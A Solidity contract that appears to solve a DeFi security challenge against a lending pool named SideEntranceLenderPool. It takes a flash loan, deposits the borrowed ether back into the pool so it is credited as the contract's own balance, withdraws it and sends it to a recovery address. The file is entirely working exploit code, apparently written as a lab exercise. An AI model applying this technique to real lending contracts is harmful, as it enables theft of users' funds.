pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attack {
    SideEntranceLenderPool public pool;
    address public owner;
    address public recovery;
    uint ethNumber;
    constructor(address _pool,address _recovery) payable {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }
    function execute() public payable {
        pool.deposit{value:address(this).balance}();
    }
    function attack(uint256 amount) public {
        pool.flashLoan(amount);

    }
    function withdrawalToPool() public {
        pool.withdraw();
    }
    function exitFund() public {
        (bool ok,) = recovery.call{value:address(this).balance}("");
        require(ok,"send fail");
    }
    receive() external payable {
        ethNumber += msg.value;
        
    }
}